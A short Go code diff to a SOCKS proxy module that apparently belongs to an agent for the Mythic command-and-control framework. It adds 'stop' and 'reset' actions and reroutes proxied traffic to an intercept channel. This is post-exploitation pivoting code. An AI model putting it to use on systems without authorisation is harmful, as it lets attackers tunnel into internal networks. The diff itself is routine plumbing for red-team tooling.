@@ -104,7 +104,7 @@ func Run(task structs.Task) {
 	args := Args{}
 	err := json.Unmarshal([]byte(task.Params), &args)
 	if !startedGoRoutines {
-		//go readFromMythic(profiles.FromMythicSocksChannel, profiles.ToMythicSocksChannel)
+		//go readFromMythic(profiles.FromMythicSocksChannel, profiles.InterceptToMythicSocksChannel)
 		go handleMutexMapModifications()
 		startedGoRoutines = true
 	}
@@ -124,9 +124,14 @@ func Run(task structs.Task) {
 		resp.UserOutput = "Socks started"
 		resp.Completed = true
 		resp.TaskID = task.TaskID
-	} else {
+	} else if args.Action == "stop" {
 		closeAllChannels()
 		resp.UserOutput = "Socks stopped"
+		resp.Completed = true
+		resp.TaskID = task.TaskID
+	} else if args.Action == "reset" {
+		closeAllChannels()
+		resp.UserOutput = "Socks data flushed"
 		resp.Completed = true
 		resp.TaskID = task.TaskID
 	}
@@ -182,7 +187,7 @@ func handleMutexMapModifications() {
 					//fmt.Printf("Failed to decode message")
 					continue
 				}
-				go connectToProxy(profiles.FromMythicSocksChannel, msg.ServerId, profiles.ToMythicSocksChannel, data)
+				go connectToProxy(profiles.FromMythicSocksChannel, msg.ServerId, profiles.InterceptToMythicSocksChannel, data)
 			}
 		}
 	}
